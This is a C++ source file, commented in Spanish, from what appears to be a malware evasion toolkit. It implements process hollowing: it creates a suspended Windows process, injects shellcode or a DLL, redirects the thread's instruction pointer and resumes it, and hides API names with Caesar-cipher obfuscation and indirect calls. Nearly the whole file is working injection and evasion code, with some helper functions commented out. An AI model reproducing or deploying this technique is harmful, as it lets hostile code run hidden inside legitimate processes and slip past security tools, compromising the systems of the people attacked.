#include "evasion\ProcessHollowing.h"
#include "Obfuscator.h"

ProcessHollowing::ProcessHollowing() {}

std::string ProcessHollowing::_DecryptFunctionName(std::vector<unsigned char>& encryptedName, unsigned char key) {
	return Obfuscator::decryptCaesar(encryptedName, key);
}

/*
LPVOID ProcessHollowing::_AllocateRemoteMemory(HANDLE hProcess, SIZE_T size) {
	LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (remoteMemory == NULL) {
		std::cerr << "Error asignando memoria para la ruta del DLL en el proceso remoto: " << GetLastError() << std::endl;
		throw std::runtime_error("Error asignando memoria para la ruta del DLL en el proceso remoto");
	}

	return remoteMemory;
}
void ProcessHollowing::_WriteRemoteMemory(HANDLE hProcess, LPVOID remoteAddress, const void* buffer, SIZE_T size) {
	if (!WriteProcessMemory(hProcess, remoteAddress, buffer, size, NULL)) {
		std::cerr << "Error escribiendo la ruta del DLL en la memoria remota: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteAddress, 0, MEM_RELEASE);
		throw std::runtime_error("Error escribiendo la ruta del DLL en la memoria remota");
	}
}

*/
/*
LPVOID ProcessHollowing::_GetLoadLibraryAddress() {
	HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
	if (hKernel32 == NULL) {
		std::cerr << "Error obteniendo el handle de kernel32.dll: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el handle de kernel32.dll");
	}

	LPVOID loadLibraryAddr = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
	if (loadLibraryAddr == NULL) {
		std::cerr << "Error obteniendo la dirección de LoadLibraryA: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo la dirección de LoadLibraryA");
	}
	return loadLibraryAddr;
}
*/

PROCESS_INFORMATION ProcessHollowing::_CreateSuspendedProcess(const std::wstring& targetProcess) {
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!api.CreateProcessW(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		std::cerr << "Error al crear el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al crear el proceso suspendido");
	}

	return pi;
}
/*
CONTEXT ProcessHollowing::_GetProcessContext(HANDLE hThread) {
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!api.GetThreadContext(hThread, &ctx)) {
		std::cerr << "Error obteniendo el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el contexto del hilo");
	}

	return ctx;
}
*/
VOID ProcessHollowing::_SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress) {
	ctx.Rip = (DWORD64)shellcodeAddress;

	// Usar la llamada indirecta a SetThreadContext
	if (!api.SetThreadContext(hThread, &ctx)) {
		std::cerr << "Error ajustando el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error ajustando el contexto del hilo");
	}

	// Usar la llamada indirecta a ResumeThread
	api.ResumeThread(hThread);
}

void  ProcessHollowing::_ResumeProcess(PROCESS_INFORMATION& pi) {
	if (ResumeThread(pi.hThread) == -1) {
		std::cerr << "Error al reanudar el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al reanudar el proceso suspendido");
	}
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

bool ProcessHollowing::InjectShellcode(const std::wstring& targetProcess, const std::vector<unsigned char>& shellcode) {
	PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

	ShellcodeInjector shellcodeInjector;
	shellcodeInjector.InjectInto(pi, shellcode);
	if (!shellcodeInjector.GetThreadContext()) {
		return false;
	}

	_ResumeProcess(pi);

	Logger::info("Shellcode successfully injected.");
	return true;
}
/*
bool ProcessHollowing::InjectDLL(const std::wstring& targetProcess, const std::wstring& dllPath) {
	try {
		// 1. Create suspended process
		PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

		// 2. DLL injection
		RemoteThreadDllInjector dllInjector;
		if (!dllInjector.InjectInto(pi, dllPath)) {
			TerminateProcess(pi.hProcess, 0);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return false;
		}

		HANDLE hRemoteThread = dllInjector.GetHRemoteThread();
		LPVOID dllPathAddress = dllInjector.GetDllPathAddress();

		// 3. ✅ ESPERAR Y VERIFICAR que el DLL se cargó
		DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000);
		if (waitResult == WAIT_TIMEOUT) {
			Logger::error("Timeout en LoadLibrary");
			TerminateProcess(pi.hProcess, 0);
			CloseHandle(hRemoteThread);
			VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			return false;
		}

		// 4. ✅ VERIFICAR resultado de LoadLibrary
		DWORD dllBaseAddress;
		if (!GetExitCodeThread(hRemoteThread, &dllBaseAddress)) {
			Logger::error("Error obteniendo exit code");
			return false;
		}

		if (dllBaseAddress == 0) {
			Logger::error("LoadLibrary falló - HMODULE = 0");
			return false;
		}

		Logger::info("DLL base address: 0x" + std::to_string(dllBaseAddress));

		// 5. ✅ ESPERAR inicialización del DLL (DllMain)
		Logger::info("Esperando inicialización del DLL...");
		Sleep(3000); // 3 segundos para DllMain

		// 6. Resources cleaning
		CloseHandle(hRemoteThread);
		VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);

		// 7. Process restart
		Logger::info("Reanudando proceso...");
		_ResumeProcess(pi);

		// 8. Cleanup
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);

		Logger::info("DLL injection completada exitosamente");
		return true;
	}
	catch (const std::exception& e) {
		Logger::error(std::string("Error en InjectDLL: ") + e.what());
	}
	return false;
}
*/
bool ProcessHollowing::InjectDLL(const std::wstring& targetProcess, const std::wstring& dllPath) {
	// 1. Create suspended process
	PROCESS_INFORMATION pi = _CreateSuspendedProcess(targetProcess);

	// 2. DLL memory assignment
	RemoteThreadDllInjector dllInjector;
	if (!dllInjector.InjectInto(pi, dllPath)) {
		Logger::error(L"Inyección falló - finalización del proceso");
		api.TerminateProcess(pi.hProcess, 0);
		_BaseCleaning(pi);
		return false;
	}

	HANDLE hRemoteThread = dllInjector.GetHRemoteThread();
	HANDLE dllPathAddress = dllInjector.GetDllPathAddress();

	// 3. Waiting for thread finishing
	DWORD waitResult = WaitForSingleObject(hRemoteThread, 10000); // 10 sec.

	if (waitResult == WAIT_TIMEOUT) {
		Logger::error(L"Timeout: LoadLibrary no completó");
		TerminateThread(hRemoteThread, 0);
		api.TerminateProcess(pi.hProcess, 0);
		CloseHandle(hRemoteThread);
		VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);
		_BaseCleaning(pi);
	}

	// 4. Resources cleaning
	CloseHandle(hRemoteThread);
	VirtualFreeEx(pi.hProcess, dllPathAddress, 0, MEM_RELEASE);

	// 5. Process restart
	_ResumeProcess(pi);

	Logger::info(L"DLL successfully loaded on target " + targetProcess);
	return true;
}

void ProcessHollowing::_BaseCleaning(PROCESS_INFORMATION pi) {
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}
